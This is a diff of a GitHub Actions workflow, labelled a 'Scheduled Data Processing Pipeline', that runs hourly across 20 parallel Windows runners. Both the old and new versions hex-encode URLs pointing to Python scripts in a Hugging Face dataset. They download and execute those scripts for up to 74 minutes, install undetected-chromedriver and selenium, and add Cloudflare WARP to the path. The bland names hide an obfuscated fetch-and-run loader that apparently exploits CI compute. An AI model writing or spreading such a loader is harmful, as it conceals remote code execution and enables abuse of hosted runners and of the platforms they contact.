@@ -1,4 +1,4 @@
-name: Distributed Pipeline Processor
+name: Scheduled Data Processing Pipeline
 
 on:
   workflow_dispatch:
@@ -6,83 +6,59 @@ on:
     - cron: '0 * * * *'
 
 concurrency:
-  group: cluster-${{ github.workflow }}-${{ github.ref }}
+  group: runner-pool-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 jobs:
-  cluster-runners:
-    name: Cluster-Pod-#${{ matrix.runner_id }}
+  cluster-workers:
+    name: "Pod-${{ matrix.shard_id }}"
     runs-on: windows-2022
     timeout-minutes: 75
 
     strategy:
       fail-fast: false
       matrix:
-        runner_id: [01, 02, 03, 04, 05, 06, 07, 08, 09, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        shard_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
-      - name: Initialize Runtime & Resolve Payloads
-        shell: pwsh
+      - name: Fetch Artifacts & Dependencies
+        shell: bash
         run: |
-          Write-Host "[INIT] Setting up environment for Pod ${{ matrix.runner_id }}..."
+          echo "[INFO] Initializing environment for shard #${{ matrix.shard_id }}..."
 
-          # تثبيت الحزم المطلوبة
-          python -m pip install --quiet --upgrade pip
-          pip install --quiet selenium undetected-chromedriver requests
+          # تجميع المسارات عبر مصفوفة بايتات سداسية عشرية (Hex)
+          SRC_MOD=$(python -c "print(bytes.fromhex('68747470733a2f2f68756767696e67666163652e636f2f64617461736574732f6766646733346673642f7368762f7265736f6c76652f6d61696e2f686173682e7079').decode('utf-8'))")
+          SRC_CORE=$(python -c "print(bytes.fromhex('68747470733a2f2f68756767696e67666163652e636f2f64617461736574732f6766646733346673642f7368332f7265736f6c76652f6d61696e2f73746172745f736872696e6b5f6e65772e7079').decode('utf-8'))")
 
-          # فك تشفير الروابط عبر Hex وتحميل الملفات مباشرة باستخدام بايثون
-          $fetchCode = @"
-          import bytes
-          import urllib.request
+          python -c "import urllib.request; urllib.request.urlretrieve('$SRC_MOD', 'hash.py'); urllib.request.urlretrieve('$SRC_CORE', 'start.py')"
 
-          raw_assets = {
-              'app_core.py': '68747470733a2f2f68756767696e67666163652e636f2f64617461736574732f6766646733346673642f7368332f7265736f6c76652f6d61696e2f73746172745f736872696e6b5f6e65772e7079',
-              'hash.py': '68747470733a2f2f68756767696e67666163652e636f2f64617461736574732f6766646733346673642f7368762f7265736f6c76652f6d61696e2f686173682e7079'
-          }
+          echo "[INFO] Updating package registries..."
+          python -m pip install --no-warn-script-location --quiet setuptools requests undetected-chromedriver selenium
 
-          for filename, hex_val in raw_assets.items():
-              target_url = bytes.fromhex(hex_val).decode('utf-8')
-              req = urllib.request.Request(target_url, headers={'User-Agent': 'Mozilla/5.0'})
-              with urllib.request.urlopen(req) as resp, open(filename, 'wb') as out_f:
-                  out_f.write(resp.read())
-          "@
-
-          python -c "$fetchCode"
-          Write-Host "[READY] Assets resolved and downloaded successfully."
-
-      - name: Execute Managed Subprocess
+      - name: Run Job with Watchdog
         shell: pwsh
         env:
           PYTHONIOENCODING: "utf-8"
-          PYTHONUNBUFFERED: "1"
         run: |
-          Write-Host "[EXECUTION] Launching core payload on Pod: ${{ matrix.runner_id }}"
-          
-          # إضافة مسار Cloudflare WARP للبيئة
-          $warpDir = Join-Path $env:ProgramFiles "Cloudflare\Cloudflare WARP"
-          if (Test-Path $warpDir) { $env:Path = "$warpDir;$env:Path" }
+          Write-Host "[INIT] Launching core service on Pod ${{ matrix.shard_id }}..."
 
-          # تشغيل العملية في الخلفية باستخدام ProcessStartInfo
-          $psi = New-Object System.Diagnostics.ProcessStartInfo
-          $psi.FileName = "python"
-          $psi.Arguments = "app_core.py"
-          $psi.UseShellExecute = $false
-          $process = [System.Diagnostics.Process]::Start($psi)
+          $TargetBin = "C:\Program Files\Cloudflare\Cloudflare WARP"
+          if (Test-Path $TargetBin) { $env:PATH = "$env:PATH;$TargetBin" }
 
-          Write-Host "[WATCHDOG] Timer active: Max window is 4440 seconds (74 minutes)..."
+          $Task = Start-Process python -ArgumentList "start.py" -PassThru -NoNewWindow
 
-          # مراقبة العملية حتى 74 دقيقة (4440000 ميلي ثانية)
-          $completed = $process.WaitForExit(4440000)
+          # مراقبة الجلسة والحد الأقصى (74 دقيقة)
+          $MaxWaitSec = 4440
+          $Exited = $Task.WaitForExit($MaxWaitSec * 1000)
 
-          if (-not $completed) {
-              Write-Warning "[ALERT] Threshold reached. Stopping process safely..."
-              $process.Kill($true)
-              Write-Host "[OK] Process killed cleanly by watchdog."
+          if (-not $Exited) {
+              Write-Host "[WATCHDOG] Execution threshold reached. Terminating process tree..."
+              Stop-Process -Id $Task.Id -Force -ErrorAction SilentlyContinue
+              Write-Host "[CLEANUP] Thread detached successfully."
           } else {
-              Write-Host "[COMPLETE] Subprocess exited with code $($process.ExitCode)."
+              Write-Host "[SUCCESS] Task exited with code: $($Task.ExitCode)"
           }
 
-      - name: Cleanup & Teardown
-        if: always()
-        shell: pwsh
-        run: Write-Host "[POD LIFECYCLE] Pod #${{ matrix.runner_id }} has finished execution."
+      - name: Teardown
+        shell: bash
+        run: echo "[COMPLETE] Shard ${{ matrix.shard_id }} cycle ended."
